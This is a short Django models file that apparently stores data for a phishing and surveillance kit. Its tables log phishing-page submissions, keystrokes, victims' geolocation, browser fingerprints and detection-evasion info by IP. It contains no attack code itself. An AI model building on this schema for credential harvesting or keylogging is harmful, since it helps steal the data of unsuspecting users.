
from django.db import models

class PhishingLog(models.Model):
    page = models.CharField(max_length=255)
    data = models.TextField()
    ip = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)

class KeystrokeLog(models.Model):
    page = models.CharField(max_length=255)
    keys = models.TextField()
    ip = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)

class GeoLog(models.Model):
    lat = models.CharField(max_length=50)
    lon = models.CharField(max_length=50)
    ip = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)

class FingerprintLog(models.Model):
    fingerprint = models.TextField()
    ip = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)

class EvasionLog(models.Model):
    info = models.TextField()
    ip = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)
